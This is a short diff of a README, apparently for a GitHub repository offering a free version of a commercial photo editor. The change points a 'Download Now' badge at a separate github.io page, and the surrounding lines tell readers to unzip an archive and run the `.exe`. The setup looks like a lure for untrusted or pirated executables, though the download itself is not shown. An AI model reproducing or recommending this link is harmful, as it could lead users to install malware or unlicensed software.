@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://acdsee-luxea-free-editor.github.io/.github/)
 
 ## 📸 Overview
 ![luxea-free-editor-timeline](https://github.com/user-attachments/assets/9841a791-0109-47be-bc67-9f1214c0a389)
